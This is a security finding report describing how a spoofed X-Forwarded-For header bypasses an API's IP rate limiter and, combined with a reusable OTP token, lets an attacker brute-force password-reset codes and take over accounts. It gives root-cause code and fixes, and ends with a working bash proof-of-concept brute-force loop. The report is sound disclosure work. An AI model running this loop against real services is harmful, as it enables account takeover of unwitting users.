### Title
IP Rate Limit Bypass via Spoofed `X-Forwarded-For` Header Enables OTP Brute-Force and Account Takeover

### Summary
The global `IpThrottlerGuard` — the only rate-limiting protection on the `POST /auth/verify-reset` endpoint — derives its tracking key from the client-controlled `X-Forwarded-For` header without any proxy-trust validation. An attacker can rotate this header on every request to make each attempt appear to come from a different IP, completely bypassing the throttler. Combined with the fact that the OTP JWT returned by `POST /auth/reset-password` is not invalidated on failed verification attempts, this allows unlimited OTP guessing against any account, leading to full account takeover.

---

### Finding Description

**Root Cause — Untrusted `X-Forwarded-For` in `IpThrottlerGuard`**

`IpThrottlerGuard.getTracker()` unconditionally prefers the `X-Forwarded-For` header over the socket-level `req.ip`:

```typescript
// back-end/apps/api/src/guards/ip-throttler.guard.ts
protected getTracker(req: Record<string, any>): Promise<string> {
  const clientIp = req.headers['x-forwarded-for'] || req.ip;
  ...
  return clientIp;
}
``` [1](#0-0) 

Because `X-Forwarded-For` is a plain HTTP header, any HTTP client can set it to an arbitrary value. There is no Express `trust proxy` configuration or header-stripping at the application layer that would prevent a direct client from injecting this header.

**Global Guard Registration**

`IpThrottlerGuard` is registered as the sole global `APP_GUARD` for the entire API:

```typescript
// back-end/apps/api/src/api.module.ts
providers: [
  { provide: APP_GUARD, useClass: IpThrottlerGuard },
  ...
]
``` [2](#0-1) 

**Vulnerable Endpoint — `POST /auth/verify-reset`**

The OTP verification endpoint has no `EmailThrottlerGuard` or `UserThrottlerGuard`. Its only rate-limiting protection is the global `IpThrottlerGuard`:

```typescript
// back-end/apps/api/src/auth/auth.controller.ts
@Post('/verify-reset')
@HttpCode(200)
@UseGuards(JwtBlackListOtpGuard, OtpJwtAuthGuard)
async verifyOtp(@GetUser() user: User, @Body() dto: OtpDto, @Req() req) {
  const result = await this.authService.verifyOtp(user, dto);
  await this.blacklistService.blacklistToken(extractJwtOtp(req));
  return result;
}
``` [3](#0-2) 

The OTP JWT is blacklisted **after** `verifyOtp` returns. If `verifyOtp` throws on a wrong OTP, the blacklist call is never reached, leaving the OTP JWT valid for the next attempt. This means an attacker can make unlimited guesses against the same OTP JWT.

**Exploit Chain**

1. Attacker calls `POST /auth/reset-password` with victim's email. The response contains an OTP JWT.
2. The OTP (e.g., a 6-digit TOTP) is sent to the victim's email; the attacker does not need it.
3. Attacker sends rapid `POST /auth/verify-reset` requests, each with a different `X-Forwarded-For` value (e.g., `1.1.1.1`, `1.1.1.2`, …) and an incremented OTP guess in the body.
4. Each request appears to the throttler as a new IP, so no limit is ever hit.
5. When the correct OTP is guessed, the attacker receives a verified JWT and can call `PATCH /auth/set-password` to set a new password, completing the account takeover.

---

### Impact Explanation

Full account takeover of any organization user whose email is known. The attacker gains the ability to:
- Set a new password, locking the legitimate user out.
- Access all transactions, user keys, and organization data visible to that account.
- Escalate if the compromised account is an admin (via `PATCH /auth/elevate-admin`).

No privileged access is required. The attacker only needs to know a valid user email, which is the input to `POST /auth/reset-password`.

---

### Likelihood Explanation

- **Attacker precondition**: Knowledge of a target email address — trivially obtained from any organization invite or public directory.
- **No authentication required** to initiate the attack.
- **Bypass is trivial**: a single `curl` loop incrementing `X-Forwarded-For` suffices.
- **OTP search space**: if the OTP is a 6-digit numeric code (1,000,000 possibilities) and the OTP expiration is 20 minutes (`OTP_EXPIRATION=20` in `example.env`), an attacker sending ~1,000 requests/second (easily achievable with no throttling) exhausts the space in ~17 minutes — within the expiration window.

---

### Recommendation

1. **Fix the tracker to use the verified socket IP only.** Remove the `X-Forwarded-For` fallback from `IpThrottlerGuard.getTracker()`. If the deployment sits behind a trusted reverse proxy, configure Express `trust proxy` correctly and use `req.ip` (which Express will then resolve from the trusted proxy chain), rather than reading the raw header directly.

2. **Add `EmailThrottlerGuard` to `POST /auth/verify-reset`.** The OTP verification endpoint must be throttled by email (the identity being attacked), not just by IP, so that header spoofing cannot bypass it.

3. **Blacklist the OTP JWT on every attempt** (success or failure) so that a single OTP JWT cannot be reused across multiple guesses.

---

### Proof of Concept

```bash
# Step 1: Trigger OTP flow and capture the OTP JWT
OTP_JWT=$(curl -s -X POST https://<host>/auth/reset-password \
  -H "Content-Type: application/json" \
  -d '{"email":"victim@example.com"}' | jq -r '.token')

# Step 2: Brute-force OTP — each request uses a different spoofed IP
for i in $(seq 0 999999); do
  FAKE_IP="10.$(( (i / 65536) % 256 )).$(( (i / 256) % 256 )).$(( i % 256 ))"
  RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" \
    -X POST https://<host>/auth/verify-reset \
    -H "Authorization: Bearer $OTP_JWT" \
    -H "X-Forwarded-For: $FAKE_IP" \
    -H "Content-Type: application/json" \
    -d "{\"otp\":\"$(printf '%06d' $i)\"}")
  if [ "$RESPONSE" = "200" ]; then
    echo "OTP found: $(printf '%06d' $i)"
    break
  fi
done
```

Each iteration presents a fresh IP to the throttler. The global limits (`GLOBAL_SECOND_LIMIT=1000`, `GLOBAL_MINUTE_LIMIT=10000` per IP) are never reached for any single spoofed IP, so the loop runs unconstrained until the correct OTP is found. [1](#0-0) [4](#0-3) [5](#0-4) [6](#0-5)
